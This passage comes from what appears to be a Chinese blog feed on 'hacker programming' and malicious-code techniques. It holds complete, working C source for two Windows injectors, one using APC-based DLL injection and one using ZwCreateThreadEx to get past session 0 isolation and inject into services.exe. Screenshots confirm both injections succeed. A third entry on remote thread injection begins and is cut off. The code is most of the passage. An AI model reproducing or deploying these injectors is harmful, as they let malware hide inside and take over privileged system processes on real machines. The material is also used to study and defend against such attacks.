class="hljs-built_in">Process32Next</span>(hSnap, &amp;PE32);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">GetAllThreadIdByProcessId</span><span class="hljs-params">(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength)</span></span><br><span class="hljs-function"></span>&#123;<br>    DWORD* pThreadId = <span class="hljs-literal">NULL</span>;<br>    DWORD dwThreadIdLength = <span class="hljs-number">0</span>;<br>    DWORD dwBufferLength = <span class="hljs-number">1000</span>;<br>    THREADENTRY32 te32 = &#123; <span class="hljs-number">0</span> &#125;;<br>    HANDLE hSnapshot = <span class="hljs-literal">NULL</span>;<br>    BOOL bRet = TRUE;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-comment">// 申请内存</span><br>        pThreadId = <span class="hljs-keyword">new</span> DWORD[dwBufferLength];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pThreadId)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请内存失败\n&quot;</span>);<br>            bRet = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-built_in">RtlZeroMemory</span>(pThreadId, (dwBufferLength * <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(DWORD)));<br>        <span class="hljs-comment">// 获取线程快照</span><br>        <span class="hljs-built_in">RtlZeroMemory</span>(&amp;te32, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(te32));<br>        te32.dwSize = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(te32);<br>        hSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hSnapshot)<br>        &#123;<br>            bRet = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// 获取第一条线程快照信息</span><br>        bRet = <span class="hljs-built_in">Thread32First</span>(hSnapshot, &amp;te32);<br>        <span class="hljs-keyword">while</span> (bRet)<br>        &#123;<br>            <span class="hljs-comment">// 获取进程对应的线程ID</span><br>            <span class="hljs-keyword">if</span> (te32.th32OwnerProcessID == dwProcessId)<br>            &#123;<br>                pThreadId[dwThreadIdLength] = te32.th32ThreadID;<br>                dwThreadIdLength++;<br>            &#125;<br><br>            <span class="hljs-comment">// 遍历下一个线程快照信息</span><br>            bRet = <span class="hljs-built_in">Thread32Next</span>(hSnapshot, &amp;te32);<br>        &#125;<br>        <span class="hljs-comment">// 返回</span><br>        *ppThreadId = pThreadId;<br>        *pdwThreadIdLength = dwThreadIdLength;<br>        bRet = TRUE;<br><br>    &#125; <span class="hljs-keyword">while</span> (FALSE);<br>    <span class="hljs-keyword">if</span> (FALSE == bRet)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pThreadId)<br>        &#123;<br>            <span class="hljs-keyword">delete</span>[]pThreadId;<br>            pThreadId = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> bRet;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">Inject</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszProcessName, <span class="hljs-keyword">char</span>* pszDllname)</span> </span>&#123;<br>    BOOL flag = FALSE;<br>    DWORD dwPID = <span class="hljs-number">0</span>;<br>    DWORD* pThreadId = <span class="hljs-literal">NULL</span>;<br>    DWORD dwThreadLength = <span class="hljs-number">0</span>;<br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>    HANDLE hThread = <span class="hljs-literal">NULL</span>;<br>    PVOID pBaseAddress = <span class="hljs-literal">NULL</span>;<br>    PVOID pLoadLibraryFunc = <span class="hljs-literal">NULL</span>;<br>    SIZE_T dwRet = <span class="hljs-number">0</span>, dwDllPathLen = <span class="hljs-built_in">strlen</span>(pszDllname) + <span class="hljs-number">1</span>;<br>    DWORD i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">//获取进程的PID</span><br>        dwPID = <span class="hljs-built_in">GetPidByName</span>(pszProcessName);<br>        <span class="hljs-keyword">if</span> (dwPID == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取PID失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//获取所有线程ID</span><br>        flag = <span class="hljs-built_in">GetAllThreadIdByProcessId</span>(dwPID, &amp;pThreadId, &amp;dwThreadLength);<br>        <span class="hljs-keyword">if</span> (flag == FALSE) &#123;<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//打开进程</span><br>        hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID);<br>        <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开进程失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//申请内存空间</span><br>        pBaseAddress = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>        <span class="hljs-keyword">if</span> (pBaseAddress == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请空间失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//向申请的空间写入内存</span><br>        <span class="hljs-built_in">WriteProcessMemory</span>(hProcess, pBaseAddress, pszDllname, dwDllPathLen, &amp;dwRet);<br>        <span class="hljs-keyword">if</span> (dwRet != dwDllPathLen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写入内存失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        pLoadLibraryFunc = <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>        <span class="hljs-keyword">if</span> (pLoadLibraryFunc == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取loadlibrary地址失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//向所有的线程插入APC函数</span><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; dwThreadLength; i++) &#123;<br>            hThread = <span class="hljs-built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, pThreadId[i]);<br>            <span class="hljs-keyword">if</span> (hThread) &#123;<br>                <span class="hljs-built_in">QueueUserAPC</span>((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)pBaseAddress);<br>                <span class="hljs-built_in">CloseHandle</span>(hThread);<br>                hThread = <span class="hljs-literal">NULL</span>;<br>            &#125;<br>        &#125;<br>        flag = TRUE;<br>    &#125; <span class="hljs-keyword">while</span> (FALSE);<br>    <span class="hljs-keyword">if</span> (hProcess) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        hProcess = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (pThreadId) &#123;<br>        <span class="hljs-keyword">delete</span>[]pThreadId;<br>        pThreadId = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> flag;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BOOL flag=<span class="hljs-built_in">Inject</span>(<span class="hljs-string">&quot;自己的文件路径&quot;</span>);<br>    <span class="hljs-keyword">if</span> (flag == TRUE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入成功\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;失败\n&quot;</span>);<br>    <span class="hljs-built_in">getchar</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></div></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>写一个MFC的小程序，点击确定按钮之后就会调用SleepEx函数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CTestApcDlg::OnBnClickedOk</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 在此添加控件通知处理程序代码</span><br><span class="hljs-built_in">SleepEx</span>(<span class="hljs-number">10000</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-comment">//CDialogEx::OnOK();</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/1.png"></p><p>然后打开我们的注入程序，看到提示已经注入成功。</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/2.png"></p><p>点击确定按钮，就会弹出我们在DLL里写好的弹窗。</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/3.png"></p><p>使用process explore工具查看可以看到我们的DLL已经注入到TestApc.exe中了。</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/4.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>注入技术-突破session 0隔离的远线程注入</title>
    <link href="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h4 id="SESSION-0隔离"><a href="#SESSION-0隔离" class="headerlink" title="SESSION 0隔离"></a>SESSION 0隔离</h4><p>在早期操作系统中，所有的服务和应用程序都是运行在同一个session中，session 0。这些一起运行的服务与应用程序，由于服务是以最高权限进行运行的，所以造成一些安全风险，恶意代码可以利用这点来提升自己的权限。</p><p>在Visita中，服务在一个叫做session0的特殊session中承载。应用程序在其他session中，这样服务与应用程序就隔离开来。这样的话，恶意代码要向注入到关键的系统服务进程中，就会因为session 0的隔离而失败。</p><p>但是直接调用zwCreateThreadEx函数可以进行远线程注入，还可以突破隔离。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>实现突破SESSION 0隔离的注入技术是使用比CreateRemoteThread函数更为底层的ZwCreateThreadEx函数来创建的远线程的。因为此函数在ntdll.dll中没有声明，所以需要使用GetProcAddress从ntdll.dll中获取该函数的导出地址。</p><p>ZwCreateThreadEx函数比CreateRemoteThread函数更为底层，那么CreateRemoteThread函数最终还是通过调用ZwCreateThreadEx函数来实现远线程创建的。为什么使用CreateRemoteThread函数没有用。经过前人的跟踪与分析，发现调用ZwCreateThreadEx函数创建远线程的时候，第七个参数的值为1，这会导致创建的线程完成后一直挂起无法恢复运行，这就是为什么DLL注入失败的原因。要想成功的话，就要直接调用ZwCreateThreadEx函数，将第七个参数设置为0，这样线程创建完成之后就会恢复运行，成功注入。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;processthreadsapi.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;atlconv.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;atlstr.h&gt;</span></span><br><span class="hljs-function">BOOL <span class="hljs-title">CreateRemoteThreadInject</span><span class="hljs-params">(DWORD dwProcessId, WCHAR* pszDllFileName)</span> </span>&#123;<br><span class="hljs-comment">//提升权限</span><br>HANDLE hToken;<br><span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken) == <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开近访问令牌失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>LUID luid;<br><span class="hljs-keyword">if</span> (LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;luid) == <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;查看特权信息失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>TOKEN_PRIVILEGES tkp;<br>tkp.PrivilegeCount = <span class="hljs-number">1</span>;<br>tkp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>tkp.Privileges[<span class="hljs-number">0</span>].Luid = luid;<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> == AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="hljs-keyword">sizeof</span>(tkp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;调节权限失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>DWORD dwSize = <span class="hljs-number">0</span>;<br>LPVOID pDllAddr = <span class="hljs-literal">NULL</span>;<br>FARPROC pFuncProcAddr = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//获取注入进程句柄</span><br>hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);<br><span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开进程失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>dwSize = lstrlen(pszDllFileName) + <span class="hljs-number">1</span>;<br><span class="hljs-comment">//printf(&quot;dwSize:%d\n&quot;, dwSize);</span><br><span class="hljs-comment">//申请内存</span><br>pDllAddr = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-keyword">if</span> (pDllAddr == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请内存失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//向申请的内存写入数据</span><br>BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * <span class="hljs-number">2</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (WriteFlag == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写入内存失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>HMODULE hNtdll = LoadLibrary(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hNtdll == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取NTDLL地址失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//获取loadlibrary</span><br>pFuncProcAddr = GetProcAddress(GetModuleHandle(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><span class="hljs-keyword">if</span> (pFuncProcAddr == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取loadlibrary地址失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">PHANDLE ThreadHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID ObjectAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpParameter,</span></span><br><span class="hljs-params"><span class="hljs-function">ULONG CreateThreadFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">SIZE_T ZeroBits,</span></span><br><span class="hljs-params"><span class="hljs-function">SIZE_T StackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">SIZE_T MaximumStackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID pUnkown)</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">PHANDLE ThreadHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID ObjectAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpParameter,</span></span><br><span class="hljs-params"><span class="hljs-function">BOOL CreateSuspended,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dwStackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dw1,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dw2,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID pUnkown)</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, <span class="hljs-string">&quot;ZwCreateThreadEx&quot;</span>);<br><span class="hljs-keyword">if</span> (ZwCreateThreadEx == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取ZW地址失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>HANDLE hRemoteThread = <span class="hljs-literal">NULL</span>;<br>ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="hljs-literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (hRemoteThread == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;创建失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>CloseHandle(hProcess);<br>FreeLibrary(hNtdll);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function">DWORD <span class="hljs-title">GetPID</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszProcessName)</span> </span>&#123;<br>HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>PROCESSENTRY32 pe = &#123; <span class="hljs-keyword">sizeof</span>(pe) &#125;;<span class="hljs-comment">//初始化</span><br>USES_CONVERSION;<br>CString ProcessName = A2T(pszProcessName);<br>BOOL flag = Process32First(hSnap, &amp;pe);<br><span class="hljs-keyword">while</span> (flag) &#123;<br><span class="hljs-keyword">if</span> (lstrcmp(pe.szExeFile, ProcessName) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> pe.th32ProcessID;<br>&#125;<br>flag = Process32Next(hSnap, &amp;pe);<br>&#125;<br>CloseHandle(hSnap);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;按下回车开始注入\n&quot;</span>);<br>getchar();<br>DWORD dwPID = GetPID(<span class="hljs-string">&quot;services.exe&quot;</span>);<br><span class="hljs-keyword">bool</span> flag = CreateRemoteThreadInject(dwPID, <span class="hljs-string">L&quot;C:\\Users\\b1ackie\\Desktop\\RemoteTest.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入失败\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入成功\n&quot;</span>);<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>尝试注入SESSION 0的service.exe，使用Process Explorer可以看到services.exe的相关信息</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/2.png"></p><p>打开程序，按下回车开始注入，显示注入成功</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/1.png"></p><p>使用Process Explorer查看services.exe的导入模块</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>注入技术-远程线程注入</title>
    <link href="/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h4 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h4><p>远程线程注入是指一个进程在另一个进程中创建线程的技术。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="OpenProcess"><a href="#OpenProcess" class="headerlink" title="OpenProcess"></a>OpenProcess</h5><p>打开现有的本地进程对象</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">HANDLE OpenProcess(<br>  DWORD dwDesiredAccess,<br>  BOOL  bInheritHandle,<br>  DWORD 